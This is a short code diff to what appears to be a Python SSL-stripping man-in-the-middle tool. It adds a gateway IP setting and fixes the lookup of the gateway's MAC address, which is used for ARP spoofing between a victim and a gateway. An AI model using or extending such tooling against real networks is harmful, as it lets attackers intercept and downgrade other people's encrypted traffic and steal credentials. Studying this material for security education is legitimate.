@@ -8,6 +8,7 @@ import sys
 class SSLStripConfig:
     iface: str
     victim_ip: Optional[str]
+    gateway_ip: Optional[str]
     website_ip: Optional[str]
     listen_port: int
     mode: str
@@ -52,7 +53,7 @@ def run_ssl_strip(config: SSLStripConfig) -> None:
     arp_db = load_arp_watcher_db()
     print("[*] Resolving MAC addresses...")
     victim_mac = get_mac(config.victim_ip, config.iface, arp_db)
-    gateway_mac = get_mac(config.website_ip, config.iface, arp_db)
+    gateway_mac = get_mac(config.gateway_ip, config.iface, arp_db)
     my_mac = scapy.get_if_hwaddr(config.iface)
 
     if not victim_mac or not gateway_mac:
